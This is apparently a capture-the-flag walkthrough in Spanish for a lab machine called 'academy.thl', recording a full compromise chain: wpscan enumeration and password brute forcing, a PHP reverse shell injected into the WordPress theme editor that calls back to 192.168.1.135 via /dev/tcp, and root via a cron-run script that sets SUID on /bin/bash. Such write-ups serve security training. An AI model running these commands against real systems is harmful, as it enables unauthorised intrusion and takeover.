PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos fuzzing al puerto 80 y encontramos la siguiente ruta:
	/wodpress

-Añadimos academy.thl al archivo /etc/hosts

-Escaneamos el wordpress con wpscan:
	-wpscan --url http://academy.thl/wordpress --enumerate vp,u
		-Encontramos el usuario: dylan

-Fuerza Bruta a dylan con wpscan:
	-wpscan --url http://academy.thl/wordpress -U dylan -P /usr/share/wordlists/rockyou.txt
		Username: dylan, Password: password1

-Nos autenticamos en la ruta /wp-admin

-Nos vamos a la siguiente ruta para inyectar el código php:
	-Herramientas --> Editor de archivos de temas --> Twenty-Twenty-Two --> Functions.php
		exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'");

-Lo ejecutamos desde la siguiente ruta y obtenemos conexión:
	-http://academy.thl/wordpress/wp-content/themes/twentytwentytwo/functions.php
		www-data@debian:/$


## Escalada de Privilegios

-Buscamos archivos que pertenezcan al usuario www-data:
	-find / -user www-data ! -path "/proc/a*" 2>/dev/null (Ignorar la 'a')
		/opt/backup.py

-Contenido de /opt/backup.py:
	-Son unas credenciales para conectarse por SSH con el usuario 'dylan':
		username = "dylan"
		password = "dylan123

-Intentamos conectarnos por ssh pero no funciona, es una rabbit hole

-Nos descargamos la herramienta pspy64 y vemos los procesos que se están ejecutando en la máquina

-Vemos que el usuario root está ejecutando el siguiente Script en una tarea CRON:
	/bin/sh -c /opt/backup.sh 

-Si nos vamos a /opt/ no encontramos ningún archivo .sh, solo está el archiv backup.py, parece haber un problema de extensiones del que nos vamos a aprovechar!!

-Nos creamos un archivo 'backup'.sh en /opt/, con el siguiente contenido:
	-chmod u+s /bin/bash

-Le damos permisos de ejecución y esperamos:
	-chmod +x backup.sh

-La tarea CRON se ha ejecutado y se han aplicado los permisos SUID sobre la /bin/bash:
	-bash -p
		bash-5.2# whoami
		root
